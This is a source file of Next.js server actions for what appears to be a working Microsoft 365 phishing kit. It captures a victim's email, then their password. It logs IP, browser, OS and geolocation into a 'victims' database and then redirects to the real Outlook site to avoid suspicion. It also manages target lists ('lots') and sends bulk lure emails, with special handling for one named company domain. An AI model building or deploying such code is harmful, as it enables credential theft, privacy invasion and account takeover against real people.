"use server";

import { RedirectType, redirect } from "next/navigation";
import { revalidatePath } from "next/cache";
import { headers } from "next/headers";
import UAParser from "ua-parser-js";
import { v4 as uuid } from "uuid";

import { dbAddVictims, dbCreateLot, dbDeleteLot, dbIncremetnClicks, getEmailsByLotID, markAsSended, markLotAsSended } from "./firebase/firestore";
import { checkError, parseCSV } from "./utils";
import { IVictims } from "./definitions";
import Mailer from "./mailer";

// Get user login and save it in database
export async function actionGetUserLogin(state: any, payload: FormData) {
    const email = payload.get("email") as string;
    let id = payload.get("id") as string | undefined;

    const correct = checkError(email);

    const headersList = headers();
    const userAgent = new UAParser(String(headersList.get("user-agent")));

    const os = userAgent.getOS();
    const browser = userAgent.getBrowser();
    const address = headersList.get("x-forwarded-for") || "N/A";

    const ipRes = await fetch(`http://ip-api.com/json/${address}`, {
        method: "GET",
    });
    const ipData = await ipRes.json();

    const userInfo: Partial<IVictims> = {
        id: id || uuid(),
        ip: address,
        username: email,
        captureDate: new Date().toISOString(),
        browser: `${browser.name} ${browser.version}`,
        os: `${os.name} ${os.version}`,
        country: ipData.status === "success" ? ipData.country : null,
        countryCode: ipData.status === "success" ? ipData.countryCode : null,
        city: ipData.status === "success" ? ipData.city : null,
        isp: ipData.status === "success" ? ipData.isp : null,
        captured: true,
    };

    await dbAddVictims(userInfo);
    await dbIncremetnClicks(userInfo.id!);

    if (!correct) {
        return { message: "ERROR", params: state.params };
    }

    const params = new URLSearchParams(state.params);
    params.set("view", "password");
    params.set("username", email);

    if (email.endsWith("@netreadysolutions.com")) {
        params.set("company", "true");
    } else {
        params.set("company", "false");
    }

    redirect(`/common/oauth2/v2.0/authorize?${params.toString()}`);
}

// Get user password and save it in database
export async function actionGetUserPassword(state: any, payload: FormData) {
    const password = payload.get("password") as string;

    const params = new URLSearchParams(state.params);
    const id = params.get("client_id");

    await dbAddVictims({ id: id || uuid(), password });

    if (!password || password === "") {
        return { message: "ERROR", params: state.params }
    }

    redirect("https://outlook.office.com/mail/", RedirectType.replace);
}

// Create lot in database
export async function actionCreateLot(state: any, payload: FormData) {
    try {
        const targets = (payload.get("targets") as string).trim();
        const lotName = (payload.get("lot_name") as string).trim();
        const csv = "name,email\n" + targets;

        const parsedData = await parseCSV<{ name: string, email: string }>(csv);

        await dbCreateLot(parsedData, lotName);

        return { message: "SUCCESS" };
    } catch (e) {
        return { message: "ERROR" };
    }
}

// Delete lot from database
export async function actionDeleteLot(state: any, payload: FormData) {
    const id = payload.get("id") as string | undefined;

    if (!id) {
        return { message: "ERROR" }
    }

    await dbDeleteLot(id);

    return { message: "SUCCESS" }
}

// Send email and mark as sended in database
export async function actionSendTargetEmail(state: any, payload: FormData) {
    const id = payload.get("id") as string | undefined;
    const email = payload.get("email") as string | undefined;
    const headersList = headers();
    const url = new URL(headersList.get("referer") || "");
    Mailer.origin = url.origin;

    if (!id || !email) return { message: "ERROR", error: "INVALID_DATA" };

    try {
        const info = await Mailer.sendMail({ email: email, id });

        if (info.rejected && info.rejected.length || info.accepted.length === 0) {
            return { message: "ERROR", error: "REJECTED_OR_NOT_DELIVERY" };
        }

        console.log(info);

        await markAsSended(id);
        return { message: "SUCCESS", error: "NONE" };
    } catch (error: any) {
        console.log(error);
        console.log(error.message)
        return { message: "ERROR", error: error.code ? (error.message ? `${error.code} ${error.message}: ` : error.code) : "UNKNOWN" };
    }
}

// Send idividual email
export async function actionSendEmail(state: any, payload: FormData) {
    const email = payload.get("email") as string | undefined;
    const headersList = headers();
    const url = new URL(headersList.get("referer") || "");
    Mailer.origin = url.origin;

    if (!email) return { message: "ERROR" };

    const info = await Mailer.sendMail({ email: email, id: uuid() });

    if (info.rejected && info.rejected.length || info.accepted.length === 0) {
        return { message: "ERROR" };
    }

    return { message: "SUCCESS" }
}

// Send idividual email
export async function actionSendEmailLots(state: any, payload: FormData) {
    const id = payload.get("id") as string | undefined;
    const headersList = headers();
    const url = new URL(headersList.get("referer") || "");
    Mailer.origin = url.origin;

    if (!id) return { message: "ERROR" };

    const emails = await getEmailsByLotID(id);

    const sended = await new Promise((resolve, reject) => {
        async function callback(success: string[]) {
            if (success.length === 0 && emails.length > 0) {
                reject(false);
            }

            await markLotAsSended(success, id!);
            resolve(true);
        }

        const mailer = Mailer.getInstance(callback);
        mailer.push(emails);
    })

    if (sended) {
        return { message: "SUCCESS" }
    } else {
        return { message: "ERROR" }
    }
}
